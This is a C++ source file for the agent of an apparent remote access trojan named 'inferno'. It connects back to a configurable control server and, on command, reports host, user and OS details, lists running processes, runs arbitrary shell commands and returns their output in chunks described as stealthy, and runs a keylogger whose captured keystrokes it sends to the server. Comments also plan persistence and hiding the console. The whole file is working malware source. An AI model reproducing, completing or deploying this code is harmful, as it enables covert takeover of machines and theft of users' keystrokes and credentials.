#include "../include/Agent.hpp"
#include <iostream>
#include <unistd.h>
#include <sys/utsname.h>
#include <pwd.h>
#include <chrono>
#include <thread>
#include <sstream>
#include <arpa/inet.h>
#include <algorithm>
#include <ctime>

namespace inferno {

Agent::Agent() : m_server_ip("127.0.0.1"), m_server_port(8080), m_state(AgentState::INIT), m_running(false) {}

Agent::Agent(const std::string& server_ip, uint16_t server_port)
    : m_server_ip(server_ip), m_server_port(server_port), m_state(AgentState::INIT), m_running(false) {}

Agent::~Agent() {
    stop();
}

void Agent::run() {
    m_running = true;
    while (m_running) {
        switch (m_state) {
            case AgentState::INIT:
                handleInit();
                break;
            case AgentState::CONNECTING:
                handleConnecting();
                break;
            case AgentState::CONNECTED:
                handleConnected();
                break;
            case AgentState::LISTENING:
                handleListening();
                break;
            case AgentState::DISPATCHING:
                // Handled internally in handleListening
                break;
            case AgentState::ERROR:
                std::cerr << "[Agent] Terminal Error State reached. Restarting INIT.\n";
                m_state = AgentState::INIT;
                break;
        }
    }
}

void Agent::stop() {
    m_running = false;
    // Socket will be closed by destructor or on reconnection
}

void Agent::handleInit() {
    std::cout << "[Agent] Initializing...\n";
    // Future: Setup persistence, hide console, etc.
    m_state = AgentState::CONNECTING;
}

void Agent::handleConnecting() {
    std::cout << "[Agent] Attempting to connect to " << m_server_ip << ":" << m_server_port << "..." << std::endl;
    if (m_socket.connectTo(m_server_ip, m_server_port)) {
        std::cout << "[Agent] Connection established." << std::endl;
        m_state = AgentState::CONNECTED;
    } else {
        std::cerr << "[Agent] Connection failed. Retrying in 5 seconds..." << std::endl;
        std::this_thread::sleep_for(std::chrono::seconds(5));
    }
}

void Agent::handleConnected() {
    // Transition to LISTENING. The Server will request info via SYS_REQ_INFO.
    m_state = AgentState::LISTENING;
}

void Agent::handleListening() {
    std::vector<uint8_t> buffer;
    ssize_t bytes = m_socket.receiveData(buffer, 4096);

    if (bytes <= 0) {
        std::cerr << "[Agent] Connection lost.\n";
        m_state = AgentState::CONNECTING;
        return;
    }

    // Accumulate in member buffer (handles TCP fragmentation)
    m_receive_buffer.insert(m_receive_buffer.end(), buffer.begin(), buffer.end());

    // Sliding buffer loop: process ALL complete packets in the buffer
    while (true) {
        // Guard: need at least a full header to inspect
        if (m_receive_buffer.size() < sizeof(PacketHeader)) break;

        // Resync: peek at magic before calling deserialize().
        // deserialize() returns nullopt for BOTH "incomplete data" and "invalid magic/checksum".
        // Without this check, a single corrupted prefix byte causes an infinite stall.
        const uint32_t magic =
            (static_cast<uint32_t>(m_receive_buffer[0]) << 24) |
            (static_cast<uint32_t>(m_receive_buffer[1]) << 16) |
            (static_cast<uint32_t>(m_receive_buffer[2]) << 8)  |
             static_cast<uint32_t>(m_receive_buffer[3]);

        if (magic != 0xDEADBEEF) {
            std::cerr << "[Agent] Buffer desync detected — discarding 1 byte to resync.\n";
            m_receive_buffer.erase(m_receive_buffer.begin());
            continue;
        }

        auto packet_opt = ::inferno::Packet::deserialize(m_receive_buffer);
        if (!packet_opt.has_value()) {
            break; // Incomplete packet — wait for more data
        }
        const size_t packet_size = sizeof(PacketHeader) + packet_opt->getPayload().size();
        handleDispatching(std::move(*packet_opt));
        // Slide: remove the consumed packet bytes from the front of the buffer
        m_receive_buffer.erase(m_receive_buffer.begin(),
                               m_receive_buffer.begin() + packet_size);
    }
}

void Agent::handleDispatching(Packet&& packet) {
    uint16_t opcode = packet.getOpcode();
    std::cout << "[Agent] Dispatching Opcode: " << opcode << std::endl;

    if (opcode == static_cast<uint16_t>(Opcode::SYS_REQ_INFO)) {
        std::string info = getSystemInfo();
        Packet res(static_cast<uint16_t>(Opcode::SYS_RES_INFO), info);
        std::vector<uint8_t> data = res.serialize();
        m_socket.sendData(data);
    } else if (opcode == static_cast<uint16_t>(Opcode::PROC_LIST_REQ)) {
        handleProcessDiscovery();
    } else if (opcode == static_cast<uint16_t>(Opcode::CMD_EXEC)) {
        handleShellExecution(std::move(packet));
    } else if (opcode == static_cast<uint16_t>(Opcode::PING)) {
        Packet pong(static_cast<uint16_t>(Opcode::PONG), "");
        std::vector<uint8_t> data = pong.serialize();
        m_socket.sendData(data);
    } else if (opcode == static_cast<uint16_t>(Opcode::KEYLOG_START)) {
        handleKeylogStart();
    } else if (opcode == static_cast<uint16_t>(Opcode::KEYLOG_STOP)) {
        handleKeylogStop();
    } else if (opcode == static_cast<uint16_t>(Opcode::KEYLOG_DUMP)) {
        handleKeylogDump();
    }
}

void Agent::handleKeylogStart() {
    std::cout << "[Agent] Starting KeyLogger...\n";
    m_keylogger.start();
}

void Agent::handleKeylogStop() {
    std::cout << "[Agent] Stopping KeyLogger...\n";
    m_keylogger.stop();
}

void Agent::handleKeylogDump() {
    std::cout << "[Agent] Dumping KeyLogger buffer...\n";
    std::string keystrokes = m_keylogger.dump();
    
    static uint32_t seq_num = 0;
    seq_num++;
    
    uint32_t timestamp = static_cast<uint32_t>(std::time(nullptr));
    uint16_t data_len = static_cast<uint16_t>(keystrokes.size());
    
    std::vector<uint8_t> payload;
    payload.reserve(10 + data_len);
    
    payload.push_back((seq_num >> 24) & 0xFF);
    payload.push_back((seq_num >> 16) & 0xFF);
    payload.push_back((seq_num >> 8) & 0xFF);
    payload.push_back(seq_num & 0xFF);
    
    payload.push_back((timestamp >> 24) & 0xFF);
    payload.push_back((timestamp >> 16) & 0xFF);
    payload.push_back((timestamp >> 8) & 0xFF);
    payload.push_back(timestamp & 0xFF);
    
    payload.push_back((data_len >> 8) & 0xFF);
    payload.push_back(data_len & 0xFF);
    
    payload.insert(payload.end(), keystrokes.begin(), keystrokes.end());
    
    Packet res(static_cast<uint16_t>(Opcode::KEYLOG_DATA), std::string(payload.begin(), payload.end()));
    m_socket.sendData(res.serialize());
}

void Agent::handleShellExecution(Packet&& packet) {
    // 1. Deserialize the command from the payload
    const auto& raw = packet.getPayload();
    if (raw.size() < 2) {
        std::cerr << "[Agent] CMD_EXEC: payload too short." << std::endl;
        return;
    }
    const uint16_t cmd_len = (static_cast<uint16_t>(raw[0]) << 8) | raw[1];
    if (raw.size() < static_cast<size_t>(2 + cmd_len)) {
        std::cerr << "[Agent] CMD_EXEC: payload truncated." << std::endl;
        return;
    }
    const std::string command(raw.begin() + 2, raw.begin() + 2 + cmd_len);
    std::cout << "[Agent] Executing: " << command << std::endl;

    // 2. Execute via ShellExecutor
    const ShellExecutor::Result result = m_shell.execute(command);

    // 3. Transmit output in 4096-byte chunks (stealth page-size chunking)
    const std::string& output = result.output;
    const size_t chunk_size   = ShellExecutor::CHUNK_SIZE;
    const size_t total        = output.size();
    size_t offset             = 0;

    auto send_chunk = [&](uint8_t status, const std::string& data) {
        std::vector<uint8_t> payload;
        payload.push_back(status);
        // Append data length (2 bytes, big-endian)
        const uint16_t len = static_cast<uint16_t>(data.size());
        payload.push_back(static_cast<uint8_t>((len >> 8) & 0xFF));
        payload.push_back(static_cast<uint8_t>(len & 0xFF));
        payload.insert(payload.end(), data.begin(), data.end());

        Packet res(static_cast<uint16_t>(Opcode::CMD_RES),
                   std::string(payload.begin(), payload.end()));
        m_socket.sendData(res.serialize());
    };

    if (total == 0) {
        // Send empty end-of-output immediately
        send_chunk(1, "");
        return;
    }

    do {
        const size_t end   = std::min(offset + chunk_size, total);
        const bool is_last = (end == total);
        const uint8_t status = is_last ? 1 : 0;
        send_chunk(status, output.substr(offset, end - offset));
        offset = end;
    } while (offset < total);
}

void Agent::handleProcessDiscovery() {
    const auto& list = m_profiler.getSnapshot();
    
    // Chunking parameters
    const size_t entries_per_page = 50;
    size_t total_pages = (list.size() + entries_per_page - 1) / entries_per_page;

    // Helper: Platfrom-independent Big-Endian serialization
    auto append_u16 = [](std::vector<uint8_t>& out, uint16_t value) {
        out.push_back(static_cast<uint8_t>((value >> 8) & 0xFF));
        out.push_back(static_cast<uint8_t>(value & 0xFF));
    };
    auto append_u32 = [](std::vector<uint8_t>& out, uint32_t value) {
        out.push_back(static_cast<uint8_t>((value >> 24) & 0xFF));
        out.push_back(static_cast<uint8_t>((value >> 16) & 0xFF));
        out.push_back(static_cast<uint8_t>((value >> 8) & 0xFF));
        out.push_back(static_cast<uint8_t>(value & 0xFF));
    };

    for (size_t p = 0; p < total_pages; p++) {
        std::vector<uint8_t> payload;
        
        // 1. Header of the page
        uint8_t is_last = (p == total_pages - 1) ? 1 : 0;
        size_t start = p * entries_per_page;
        size_t end = std::min(start + entries_per_page, list.size());
        uint16_t entries_in_page = static_cast<uint16_t>(end - start);

        // Serialization
        append_u16(payload, static_cast<uint16_t>(p)); // Page Index
        payload.push_back(is_last);
        append_u16(payload, entries_in_page);

        // 2. Add entries
        for (size_t i = start; i < end; i++) {
            uint16_t name_len = static_cast<uint16_t>(list[i].name.length());

            append_u32(payload, list[i].pid);
            append_u16(payload, name_len);

            // Name
            payload.insert(payload.end(), list[i].name.begin(), list[i].name.end());
        }

        Packet res(static_cast<uint16_t>(Opcode::PROC_LIST_RES), 
                  std::string(payload.begin(), payload.end()));
        
        m_socket.sendData(res.serialize());
    }
}

std::string Agent::getSystemInfo() {
    std::stringstream ss;
    ss << "Host: " << getHostname() << " | ";
    ss << "User: " << getUsername() << " | ";
    ss << "OS: " << getOSVersion();
    return ss.str();
}

std::string Agent::getHostname() {
    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) == 0) {
        return std::string(hostname);
    }
    return "Unknown";
}

std::string Agent::getUsername() {
    char username[256];
    if (getlogin_r(username, sizeof(username)) == 0) {
        return std::string(username);
    }
    // Fallback
    struct passwd* pw = getpwuid(getuid());
    if (pw) {
        return std::string(pw->pw_name);
    }
    return "Unknown";
}

std::string Agent::getOSVersion() {
    struct utsname buffer;
    if (uname(&buffer) == 0) {
        std::stringstream ss;
        ss << buffer.sysname << " " << buffer.release << " (" << buffer.machine << ")";
        return ss.str();
    }
    return "Linux/Generic";
}

} // namespace inferno
